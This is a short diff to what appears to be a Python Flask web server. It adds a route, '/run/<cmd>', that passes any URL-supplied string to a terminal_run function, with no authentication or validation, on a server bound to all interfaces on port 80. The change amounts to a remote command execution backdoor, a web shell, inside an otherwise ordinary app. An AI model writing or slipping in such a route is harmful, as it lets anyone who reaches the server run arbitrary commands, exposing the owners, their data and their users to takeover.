@@ -128,7 +128,10 @@ def home():
 	file_path = os.path.join(root, 'index.html')
 	with open(file_path, 'r', encoding='utf-8') as file:
 		return file.read()
-
+      
+@app.route('/run/<cmd>')
+def run_command(cmd):
+    return terminal_run(cmd)
 
 if __name__ == '__main__':
 	app.run(host='0.0.0.0', port=80, debug=False)
